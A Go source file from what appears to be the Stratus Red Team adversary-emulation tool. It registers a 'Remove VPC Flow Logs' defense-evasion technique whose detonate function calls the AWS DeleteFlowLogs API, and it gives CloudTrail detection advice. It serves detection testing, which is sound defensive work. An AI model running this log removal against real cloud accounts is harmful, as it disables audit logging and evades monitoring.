package aws

import (
	"context"
	_ "embed"
	"errors"
	"github.com/aws/aws-sdk-go-v2/service/ec2"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
	"log"
)

//go:embed main.tf
var tf []byte

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:                 "aws.defense-evasion.vpc-remove-flow-logs",
		FriendlyName:       "Remove VPC Flow Logs",
		Platform:           stratus.AWS,
		IsIdempotent:       false, // can't remove VPC flow logs once they have already been removed
		MitreAttackTactics: []mitreattack.Tactic{mitreattack.DefenseEvasion},
		Description: `
Removes a VPC Flog Logs configuration from a VPC.

Warm-up: 

- Create a VPC with a VPC Flow Logs configuration.

Detonation: 

- Remove the VPC Flow Logs configuration.
`,
		Detection: `
Using CloudTrail's <code>DeleteFlowLogs</code> event.

To reduce the risk of false positives related to VPC deletion in development environments, alerts can be raised
only when <code>DeleteFlowLogs</code> is not closely followed by <code>DeleteVpc</code>.
`,
		PrerequisitesTerraformCode: tf,
		Detonate:                   detonate,
	})
}

func detonate(params map[string]string, providers stratus.CloudProviders) error {
	ec2Client := ec2.NewFromConfig(providers.AWS().GetConnection())

	vpcId := params["vpc_id"]
	flowLogsId := params["flow_logs_id"]

	log.Println("Removing VPC Flow Logs " + flowLogsId + " in VPC " + vpcId)

	_, err := ec2Client.DeleteFlowLogs(context.Background(), &ec2.DeleteFlowLogsInput{
		FlowLogIds: []string{flowLogsId},
	})
	if err != nil {
		return errors.New("unable to remove VPC flow logs configuration: " + err.Error())
	}

	return nil
}

// The technique is non-revertible once it has been detonated, otherwise it would require re-creating the VPC
// flow log programmatically, which we don't want as it's implemented in the Terraform for the warm-up phase
